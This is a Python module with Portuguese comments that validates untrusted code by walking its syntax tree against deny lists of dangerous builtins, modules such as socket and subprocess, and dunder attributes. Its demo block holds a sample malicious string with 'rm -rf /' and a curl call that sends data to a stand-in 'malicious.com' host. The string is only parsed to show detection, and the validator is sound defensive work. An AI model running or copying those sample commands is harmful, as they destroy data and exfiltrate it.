"""
core/security_validator.py - Validação de Segurança para Execução de Código

Este módulo fornece validação robusta de código Python antes da execução,
protegendo contra código malicioso e operações perigosas.
"""
import ast
import logging
from typing import Dict, List, Set, Tuple, Any
from dataclasses import dataclass
from enum import Enum


logger = logging.getLogger(__name__)


class SecurityLevel(Enum):
    """Níveis de segurança para validação."""
    STRICT = "strict"       # Máxima segurança, mínima funcionalidade
    STANDARD = "standard"   # Balanceado
    PERMISSIVE = "permissive"  # Menos restrições (use com cuidado)


@dataclass
class ValidationResult:
    """Resultado da validação de código."""
    is_valid: bool
    violations: List[str]
    warnings: List[str]
    security_level: SecurityLevel
    analyzed_nodes: int


class CodeSecurityValidator:
    """
    Validador de segurança para código Python.
    
    Usa AST (Abstract Syntax Tree) para analisar código sem executá-lo,
    detectando padrões perigosos e operações não permitidas.
    """
    
    # Funções builtin perigosas
    DANGEROUS_BUILTINS = {
        'exec', 'eval', 'compile', '__import__',
        'open', 'file', 'input', 'raw_input',
        'execfile', 'reload'
    }
    
    # Módulos perigosos
    DANGEROUS_MODULES = {
        'os', 'sys', 'subprocess', 'socket',
        'requests', 'urllib', 'http', 'ftplib',
        'telnetlib', 'smtplib', 'ssl', 'multiprocessing',
        'threading', 'ctypes', 'importlib', 'pickle'
    }
    
    # Atributos perigosos
    DANGEROUS_ATTRIBUTES = {
        '__code__', '__globals__', '__builtins__',
        '__dict__', '__class__', '__bases__',
        '__subclasses__', '__init__', '__import__'
    }
    
    # Operações permitidas em modo STRICT
    ALLOWED_NODES_STRICT = {
        ast.Module, ast.Expr, ast.Constant, ast.Name,
        ast.Load, ast.Store, ast.BinOp, ast.UnaryOp,
        ast.Compare, ast.BoolOp, ast.Call, ast.Attribute,
        ast.List, ast.Tuple, ast.Dict, ast.Set,
        ast.ListComp, ast.DictComp, ast.SetComp,
        ast.Lambda, ast.IfExp, ast.JoinedStr, ast.FormattedValue,
        ast.Assign, ast.AugAssign, ast.AnnAssign,
        ast.If, ast.For, ast.While, ast.Break, ast.Continue,
        ast.Pass, ast.FunctionDef, ast.Return, ast.Yield,
        ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Mod,
        ast.Pow, ast.FloorDiv, ast.And, ast.Or, ast.Not,
        ast.Eq, ast.NotEq, ast.Lt, ast.LtE, ast.Gt, ast.GtE,
        ast.Is, ast.IsNot, ast.In, ast.NotIn
    }
    
    def __init__(self, security_level: SecurityLevel = SecurityLevel.STANDARD):
        """
        Inicializa o validador.
        
        Args:
            security_level: Nível de segurança a aplicar
        """
        self.security_level = security_level
        self.violations: List[str] = []
        self.warnings: List[str] = []
        self.analyzed_nodes = 0
    
    def validate(self, code: str) -> ValidationResult:
        """
        Valida código Python.
        
        Args:
            code: Código Python como string
            
        Returns:
            ValidationResult com detalhes da validação
            
        Raises:
            SyntaxError: Se código tem erro de sintaxe
        """
        self.violations = []
        self.warnings = []
        self.analyzed_nodes = 0
        
        try:
            tree = ast.parse(code)
        except SyntaxError as e:
            self.violations.append(f"Erro de sintaxe: {e}")
            return ValidationResult(
                is_valid=False,
                violations=self.violations,
                warnings=self.warnings,
                security_level=self.security_level,
                analyzed_nodes=0
            )
        
        # Analisar árvore AST
        self._analyze_tree(tree)
        
        is_valid = len(self.violations) == 0
        
        return ValidationResult(
            is_valid=is_valid,
            violations=self.violations,
            warnings=self.warnings,
            security_level=self.security_level,
            analyzed_nodes=self.analyzed_nodes
        )
    
    def _analyze_tree(self, tree: ast.AST) -> None:
        """Analisa árvore AST recursivamente."""
        for node in ast.walk(tree):
            self.analyzed_nodes += 1
            self._check_node(node)
    
    def _check_node(self, node: ast.AST) -> None:
        """Verifica um nó específico da AST."""
        # Verificar tipo de nó em modo STRICT
        if self.security_level == SecurityLevel.STRICT:
            if type(node) not in self.ALLOWED_NODES_STRICT:
                self.violations.append(
                    f"Operação não permitida em modo STRICT: {type(node).__name__}"
                )
        
        # Verificar imports
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            self._check_import(node)
        
        # Verificar chamadas de função
        elif isinstance(node, ast.Call):
            self._check_function_call(node)
        
        # Verificar atributos
        elif isinstance(node, ast.Attribute):
            self._check_attribute(node)
        
        # Verificar raise/try/except (permitido apenas em PERMISSIVE)
        elif isinstance(node, (ast.Raise, ast.Try, ast.ExceptHandler)):
            if self.security_level == SecurityLevel.STRICT:
                self.violations.append(
                    f"Tratamento de exceções não permitido em modo STRICT"
                )
        
        # Verificar with statement (arquivos, context managers)
        elif isinstance(node, ast.With):
            self._check_with_statement(node)
        
        # Verificar delete
        elif isinstance(node, ast.Delete):
            self.warnings.append("Uso de 'del' detectado")
        
        # Verificar global/nonlocal
        elif isinstance(node, (ast.Global, ast.Nonlocal)):
            if self.security_level != SecurityLevel.PERMISSIVE:
                self.violations.append(
                    f"Modificação de escopo não permitida: {type(node).__name__}"
                )
    
    def _check_import(self, node: ast.AST) -> None:
        """Verifica declarações de import."""
        if isinstance(node, ast.Import):
            for alias in node.names:
                module_name = alias.name.split('.')[0]
                if module_name in self.DANGEROUS_MODULES:
                    self.violations.append(
                        f"Import de módulo perigoso não permitido: {module_name}"
                    )
        
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                module_name = node.module.split('.')[0]
                if module_name in self.DANGEROUS_MODULES:
                    self.violations.append(
                        f"Import de módulo perigoso não permitido: {module_name}"
                    )
    
    def _check_function_call(self, node: ast.Call) -> None:
        """Verifica chamadas de função."""
        # Verificar chamadas diretas de builtins perigosos
        if isinstance(node.func, ast.Name):
            func_name = node.func.id
            if func_name in self.DANGEROUS_BUILTINS:
                self.violations.append(
                    f"Chamada de função perigosa não permitida: {func_name}()"
                )
        
        # Verificar chamadas de métodos perigosos
        elif isinstance(node.func, ast.Attribute):
            attr_name = node.func.attr
            if attr_name in self.DANGEROUS_ATTRIBUTES:
                self.violations.append(
                    f"Acesso a atributo perigoso: {attr_name}"
                )
    
    def _check_attribute(self, node: ast.Attribute) -> None:
        """Verifica acesso a atributos."""
        if node.attr in self.DANGEROUS_ATTRIBUTES:
            self.violations.append(
                f"Acesso a atributo especial não permitido: {node.attr}"
            )
        
        # Verificar padrões suspeitos
        if node.attr.startswith('__') and node.attr.endswith('__'):
            self.warnings.append(
                f"Acesso a atributo dunder detectado: {node.attr}"
            )
    
    def _check_with_statement(self, node: ast.With) -> None:
        """Verifica declarações with."""
        # Em modo STRICT, proibir with completamente
        if self.security_level == SecurityLevel.STRICT:
            self.violations.append(
                "Declaração 'with' não permitida em modo STRICT"
            )
        else:
            self.warnings.append(
                "Uso de context manager detectado - verifique segurança"
            )


def validate_code_safe(
    code: str,
    security_level: SecurityLevel = SecurityLevel.STANDARD
) -> Tuple[bool, List[str]]:
    """
    Função helper para validação rápida.
    
    Args:
        code: Código a validar
        security_level: Nível de segurança
        
    Returns:
        Tupla (is_valid, violations)
        
    Example:
        >>> is_valid, violations = validate_code_safe("x = 1 + 2")
        >>> print(is_valid)
        True
        
        >>> is_valid, violations = validate_code_safe("import os; os.system('ls')")
        >>> print(violations)
        ['Import de módulo perigoso não permitido: os']
    """
    validator = CodeSecurityValidator(security_level)
    result = validator.validate(code)
    return result.is_valid, result.violations


# Exemplos de uso
if __name__ == "__main__":
    # Código seguro
    safe_code = """
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

result = fibonacci(10)
print(f"Fibonacci(10) = {result}")
"""
    
    # Código perigoso
    dangerous_code = """
import os
import subprocess

# Tentar executar comando do sistema
os.system('rm -rf /')
subprocess.run(['curl', 'http://malicious.com/steal_data'])

# Tentar usar eval
user_input = "malicious code"
eval(user_input)
"""
    
    print("=" * 60)
    print("TESTE: Código Seguro")
    print("=" * 60)
    validator = CodeSecurityValidator(SecurityLevel.STANDARD)
    result = validator.validate(safe_code)
    print(f"Válido: {result.is_valid}")
    print(f"Violações: {result.violations}")
    print(f"Avisos: {result.warnings}")
    print(f"Nós analisados: {result.analyzed_nodes}")
    
    print("\n" + "=" * 60)
    print("TESTE: Código Perigoso")
    print("=" * 60)
    result = validator.validate(dangerous_code)
    print(f"Válido: {result.is_valid}")
    print(f"Violações:")
    for v in result.violations:
        print(f"  - {v}")
    print(f"Nós analisados: {result.analyzed_nodes}")
